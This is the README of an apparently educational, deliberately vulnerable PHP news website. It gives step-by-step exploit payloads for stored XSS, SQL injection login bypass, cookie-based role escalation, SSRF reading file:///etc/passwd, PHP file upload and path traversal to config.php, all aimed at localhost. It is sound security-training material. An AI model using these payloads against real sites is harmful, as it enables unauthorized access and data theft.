# Vulnerable Website Project

This project demonstrates a variety of common web application vulnerabilities. It includes examples of unpatched and patched code for educational purposes. The aim is to showcase potential exploits and how to mitigate them effectively.

## Disclaimer
This project is intended solely for educational and research purposes. It demonstrates common web application vulnerabilities, both patched and unpatched, to highlight potential security risks and appropriate mitigation techniques. Unauthorized exploitation of these vulnerabilities is illegal and unethical. Users should not attempt to exploit these vulnerabilities in any live or production environment. Always ensure that appropriate security measures are in place when developing and deploying web applications.

## Table of Contents
1. [Project Overview](#project-overview)
2. [Setup Instructions](#setup-instructions)
3. [Vulnerabilities Addressed](#vulnerabilities-addressed)
4. [Database Configuration](#database-configuration)
5. [References](#references)

## Project Overview

This project simulates a Turkish financial news website with several intentional vulnerabilities:
- **Stored XSS**
- **SQL Injection**
- **Incorrect Authorization (CWE-863)**
- **Server-Side Request Forgery (SSRF)**
- **Unrestricted File Upload (CWE-434)**
- **Path Traversal (CWE-35)**


## Setup Instructions

1. Clone this repository.
2. docker-compose up --build
3. Set up the database:
   - Access the database management tool at `http://localhost:8081/index.php`.
   - Login credentials:
     - **Username:** `root`
     - **Password:** `secret`
4. Import the provided SQL file to initialize the database schema.
5. Access the website at http://localhost:8080.

## Vulnerabilities Addressed

### **Stored Cross-Site Scripting (XSS)**
   - **Category:** Injection (OWASP Top 10 - A03:2021)
   - **File:** `news.php`
   - **Exploit:** Malicious JavaScript injected in user comments.

#### Exploit Steps:
1. Submit the following malicious JavaScript code as a comment:
   ```html
   <script>alert('XSS Attack!');</script>
   ```
2. Any user who views the page where this comment is displayed will execute the script in their browser.

-- & & & -- & & & -- & & & -- & & & --
   
### **SQL Injection 1**
   - **Category:** Injection (OWASP Top 10 - A03:2021)
   - **Files:** `subscribe.php`
   - **Exploit:** Unsanitized inputs allow malicious SQL queries.

#### Exploit Steps:
1. Use the following payloads for the username and password fields:
   - **Username:** `' OR 1=1 --`
   - **Password:** (any input)
2. The SQL query becomes:
   ```sql
   SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = anything;
   ```
3. This query bypasses authentication by always evaluating OR 1=1 as TRUE.
4.	Log in as the first user in the database.

-- & & & -- & & & -- & & & -- & & & --

### **SQL Injection 2**
   - **Category:** Injection (OWASP Top 10 - A03:2021)
   - **Files:** `login.php`
   - **Exploit:** Unsanitized inputs allow malicious SQL queries.

#### Exploit Steps:
1. Use the following payloads for the email field:
   - **Email:** `any@any.com' OR '1'='1`
2. The SQL query becomes:
   ```sql
   SELECT * FROM subscribers WHERE email = 'any@any.com' OR '1'='1';
   ```
3. Gain unauthorized access to all subscriber data.

-- & & & -- & & & -- & & & -- & & & --

### **Incorrect Authorization**
   - **Category:**  Broken Access Control (OWASP Top 10 - A01:2021)
   - **Files:** `navbar.php`, `admin_users.php`
   - **Exploit:** Role-based access control bypass using cookie manipulation.

#### Exploit Steps:
1. Sign up and log in as a user.
2. Open the browser console and set the role cookie:
  ```javascript
   document.cookie = "role=admin";
  ```
3. Refresh the page to reveal the admin links.
4. Navigate to `admin_users.php` to access sensitive information such as user data.

-- & & & -- & & & -- & & & -- & & & --

### **Server-Side Request Forgery (SSRF)**
   - **Category:** Server-Side Request Forgery (OWASP Top 10 - A10:2021)
   - **File:** `check_feeds.php`
   - **Exploit:** Unvalidated URL input allows access to internal resources.
#### Exploit Steps:
1. Use the following payloads as URL inputs:
   `http://host.docker.internal:8081`
   `file:///var/www/html/check_feeds.php`
   `file:///etc/passwd`
   `ANY WEBSITE LINK YOU WISH`
2.	Access sensitive content such as internal services or server files.

-- & & & -- & & & -- & & & -- & & & --

### **Unrestricted File Upload**
   - **Category:** Broken Access Control (OWASP Top 10 - A01:2021)
   - **File:** `signup.php`
   - **Exploit:** Upload of PHP scripts allows remote code execution.
  
#### Exploit Steps:
1. Create a malicious code or upload the following PHP file as a profile picture to test:
   ```php
   <?php
   echo "File upload successful!";
   echo "<div style='text-align: center; margin-top: 20px; font-size: 24px; color: red;'>YOU ARE HACKED !! I CAN RUN HERE !! HEHEHE !!</div>";
   ?>
   ```
2. Access the uploaded file via:
   `http://localhost/uploads/CREATED_NAME_OF_PHP.php`

-- & & & -- & & & -- & & & -- & & & --

### **Path Traversal**
   - **Category:** Broken Access Control (OWASP Top 10 2021 - A01:2021)
   - **File:** `export_news.php`
   - **Exploit:** Directory traversal via `../` sequences in user input.

#### Exploit Steps:
1. Export a text file as a normal user.
2. Use the following payloads in the file parameter:
   `http://localhost/export_news.php?file=....//config.php`
   `http://localhost/export_news.php?file=....//navbar.php`
3. Retrieve and download the respective files.


## Database Configuration

- **URL:** `http://localhost:8081/index.php`
- **Credentials:**
  - Admin:
    - **Username:** `admin`
    - **Password:** `123456`
  - User:
    - **Username:** `user123`
    - **Password:** `123456`

### Tables
1. **Users**
   - Stores user credentials, profile pictures, and roles.
   - Fields: `user_id`, `username`, `password` (hashed), `email`, `role`, `profile_picture`, `created_at`.
2. **Comments**
   - Holds user-generated comments linked to news articles.
   - Fields: `comment_id`, `news_url`, `user_id`, `comment`, `created_at`.
3. **Subscribers**
   - Contains newsletter subscriber information.
   - Fields: `subscriber_id`, `email`, `created_at`.

---

## References

- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [File Upload Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Path Traversal Prevention](https://owasp.org/www-community/attacks/Path_Traversal)
